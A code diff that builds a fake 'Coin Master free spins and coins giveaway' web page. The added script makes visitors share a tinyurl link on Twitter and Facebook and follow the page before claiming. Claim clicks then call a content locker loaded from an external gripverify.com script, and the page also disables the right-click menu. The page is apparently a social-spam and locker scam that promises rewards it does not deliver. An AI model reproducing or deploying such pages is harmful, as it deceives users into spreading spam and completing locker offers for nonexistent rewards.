@@ -30,12 +30,16 @@
             border-radius: 6px;
             align-items: center;
             background-color: aliceblue;
+            padding: 2em;
         }
         .column {
             border: 0px solid red;
         }
         .gap2em {
             margin-top: 2em;
+        }
+        .gap1em {
+            margin-top: 1em;
         }
         .reward {
             width: 100%;
@@ -60,10 +64,14 @@
             text-align: center;
         }
         .steps {
-            border: 1px solid green;
+            /* border: 1px solid green; */
             width: 100%;
             max-width: 480px;
             text-align: center;
+            padding-bottom: 24px;
+            box-shadow: 0px 2px 7px 0px rgba(0,0,0,0.75);
+            -webkit-box-shadow: 0px 2px 7px 0px rgba(0,0,0,0.75);
+            -moz-box-shadow: 0px 2px 7px 0px rgba(0,0,0,0.75);
         }
         .stepText {
             font-size: 1.5em;
@@ -78,28 +86,100 @@
         .stepClaim {
             color: green;
         }
+        .claim {
+            width: 100%;
+            max-width: 240px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
+    <div id="fb-root"></div>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v14.0" nonce="ivgEOM1z"></script>
+
     <div class="container">
         <div class="column"><img class="logo" src="./images/coin-master-logo-.png" alt=""></div>
         <div class="column"><p class="message">FREE Spins and Coins Giveaway! <span class="hlt">(Update Links Daily)</span></p></div>
-        <div class="column"><img class="reward" src="./images/coin-master-rewards-2.jpg" alt=""></div>
+        <div class="column"><img class="reward" src="./images/coin-master-rewards.jpg" alt=""></div>
         <div class="column"><p class="instruction">Follow 2 Easy Steps Below to Claim Your Reward:</p></div>
         <div class="column steps">
             <span class="stepText">STEP 1:</span>
             <p class="stepsTextMessage">Tweet on Twitter or Share on Facebook.<br/>The more you share the more rewards you will get.</p>
+            <div>
+                <a id="twitter-share" href="https://twitter.com/share?&text=Claim%20Your%20FREE%20Coins%20and%20SPINS%20Today!%20%F0%9F%91%89%20https%3A%2F%2Ftinyurl.com%2FCMGiveaways%0A%0A%23coinmaster%20%23coinmasterspin%20%23coinmasterfreespin%20%23coinmasterbonus%20%23coinmaster%20%23coinmasterfreespinslink%20%23coinmasterrewards" onclick="popupWindow(this.href, 'Share on Twitter', window, 500, 350)" target="_blank" title="Share on Twitter">Share on Twitter</a>
+            </div>
+
+            <div class="gap1em">
+                <a id="facebook-share" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.facebook.com%2F100430466118095%2Fphotos%2Fa.116476127846862%2F116476067846868%2F&t=Coin%20Master%20Giveaway" onclick="popupWindow(this.href, 'Share on Facebook', window, 500, 350)" target="_blank" title="Share on Facebook">Share on Facebook</a>
+            </div>
         </div>
         <div class="column steps gap2em">
             <span class="stepText">STEP 2:</span>
             <p class="stepsTextMessage">Follow us on Twitter or Facebook<br/>Get updates on our latest Coin Master Giveaways!</p>
+            <div>
+                <a id="twitter-follow" href="https://twitter.com/coinmasterfan6?ref_src=twsrc%5Etfw" onclick="popupWindow(this.href, 'Follow Us on Twitter', window, 500, 350)" target="_blank" title="Follow on Twitter">Follow on Twitter</a>
+            </div>
+            <div class="gap1em">
+                <a id="facebook-follow" href="https://www.facebook.com/plugins/page.php?href=https%3A%2F%2Fwww.facebook.com%2FCoin-Master-Fans-100430466118095&tabs&width=450&height=130&small_header=false&adapt_container_width=true&hide_cover=false&show_facepile=true&appId" onclick="popupWindow(this.href, 'Like on Facebook', window, 450, 130)" target="_blank" title="Like on Facebook">Like on Facebook</a>
+            </div>
         </div>
         <div class="column steps gap2em">
             <span class="stepText">CLAIM</span>
             <p class="stepsTextMessage">Congratulations! Pick the reward of your choice and enjoy!</p>
+            <a href="javascript:void(0);" onclick ="checkStatus()" id="claim1"><img class="claim" src="./images/claim-now-60b-50k.png" alt=""></a>
+            <a href="javascript:void(0);" onclick ="checkStatus()" id="claim2"><img class="claim gap2em" src="./images/claim-now-40b-35k.png" alt=""></a>
+            <a href="javascript:void(0);" onclick ="checkStatus()" id="claim3"><img class="claim gap2em" src="./images/claim-now-12b-20k.png" alt=""></a>
         </div>
 
     </div>
+
+    <script>
+        function checkStatus() {
+
+            if (!(twitterShareClick && facebookShareClick)) {
+                alert("Please complete STEP 1 first before claiming this reward.")
+            } else if (!(twitterFollowClick && facebookFollowClick)) {
+                alert("Please complete STEP 2 first before claiming this reward.")
+            } else {
+                call_locker();
+            }
+        }
+
+        function popupWindow(url, windowName, win, w, h) {
+            const y = win.top.outerHeight / 2 + win.top.screenY - ( h / 2);
+            const x = win.top.outerWidth / 2 + win.top.screenX - ( w / 2);
+            return win.open(url, windowName, `toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width=${w}, height=${h}, top=${y}, left=${x}`);
+        }
+
+        let [
+            twitterShareClick,
+            facebookShareClick,
+            twitterFollowClick,
+            facebookFollowClick,
+            ] = [false, false, false, false];
+
+
+        document.getElementById("twitter-share").addEventListener("click", () => {
+            twitterShareClick = true;
+        });
+
+        document.getElementById("facebook-share").addEventListener("click", () => {
+            facebookShareClick = true;
+        });
+
+        document.getElementById("twitter-follow").addEventListener("click", () => {
+            twitterFollowClick = true;
+        });
+        
+        document.getElementById("facebook-follow").addEventListener("click", () => {
+            facebookFollowClick = true;
+        });
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+    </script>
+
+    <script type="text/javascript" src="https://gripverify.com/script_include.php?id=1204733"></script>
+
 </body>
 </html>
 
